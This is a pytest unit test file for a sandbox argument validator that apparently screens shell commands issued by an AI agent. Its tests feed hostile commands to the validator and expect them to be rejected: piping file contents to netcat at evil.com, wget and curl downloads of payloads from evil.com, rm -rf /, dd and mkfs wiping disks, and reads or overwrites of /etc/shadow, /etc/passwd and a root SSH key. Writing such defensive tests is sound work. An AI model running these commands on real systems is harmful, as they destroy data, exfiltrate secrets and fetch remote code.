# tests/unit/test_argument_validator.py
"""Unit tests for the argument validator."""

import pytest

from src.agents.sandbox.argument_validator import ArgumentValidator, ValidationResult


@pytest.fixture
def validator():
    return ArgumentValidator()


class TestInjectionPrevention:
    def test_pipe_blocked(self, validator):
        r = validator.validate("cat /etc/hosts | nc evil.com 1234")
        assert not r.valid
        assert "pipe" in r.rejection_reason.lower()

    def test_semicolon_blocked(self, validator):
        r = validator.validate("whoami; rm -rf /")
        assert not r.valid

    def test_command_substitution_dollar_blocked(self, validator):
        r = validator.validate("echo $(cat /etc/shadow)")
        assert not r.valid

    def test_backtick_blocked(self, validator):
        r = validator.validate("echo `id`")
        assert not r.valid

    def test_double_ampersand_blocked(self, validator):
        r = validator.validate("ls && rm -rf /")
        assert not r.valid

    def test_double_pipe_blocked(self, validator):
        r = validator.validate("false || rm -rf /")
        assert not r.valid

    def test_redirect_to_dev_blocked(self, validator):
        r = validator.validate("echo x > /dev/sda")
        assert not r.valid

    def test_clean_command_passes(self, validator):
        r = validator.validate("apt-get install -y nginx")
        assert r.valid


class TestDangerousPatterns:
    def test_rm_rf_root_blocked(self, validator):
        r = validator.validate("rm -rf /")
        assert not r.valid
        assert "dangerous" in r.rejection_reason.lower()

    def test_dd_blocked(self, validator):
        r = validator.validate("dd if=/dev/zero of=/dev/sda")
        assert not r.valid

    def test_mkfs_blocked(self, validator):
        r = validator.validate("mkfs.ext4 /dev/sda1")
        assert not r.valid

    def test_wget_blocked(self, validator):
        r = validator.validate("wget http://evil.com/payload")
        assert not r.valid

    def test_curl_download_blocked(self, validator):
        r = validator.validate("curl -o /tmp/payload http://evil.com/x")
        assert not r.valid

    def test_chmod_777_blocked(self, validator):
        r = validator.validate("chmod 777 /etc/passwd")
        assert not r.valid

    def test_overwrite_passwd_blocked(self, validator):
        r = validator.validate("tee /etc/passwd")
        assert not r.valid

    def test_overwrite_shadow_blocked(self, validator):
        r = validator.validate("cp /tmp/evil /etc/shadow")
        assert not r.valid


class TestPathValidation:
    def test_allowed_path_passes(self, validator):
        r = validator.validate("cat /etc/ssh/sshd_config")
        assert r.valid

    def test_disallowed_path_blocked(self, validator):
        r = validator.validate("cat /root/.ssh/id_rsa")
        assert not r.valid
        assert "path" in r.rejection_reason.lower()

    def test_etc_ssl_allowed(self, validator):
        r = validator.validate("cat /etc/ssl/openssl.cnf")
        assert r.valid

    def test_package_manager_exempt(self, validator):
        """Package managers don't need path validation."""
        r = validator.validate("apt-get install nginx")
        assert r.valid

    def test_systemctl_exempt(self, validator):
        r = validator.validate("systemctl restart sshd")
        assert r.valid


class TestEdgeCases:
    def test_empty_command_blocked(self, validator):
        r = validator.validate("")
        assert not r.valid

    def test_whitespace_only_blocked(self, validator):
        r = validator.validate("   ")
        assert not r.valid

    def test_very_long_command_blocked(self, validator):
        r = validator.validate("a" * 5000)
        assert not r.valid
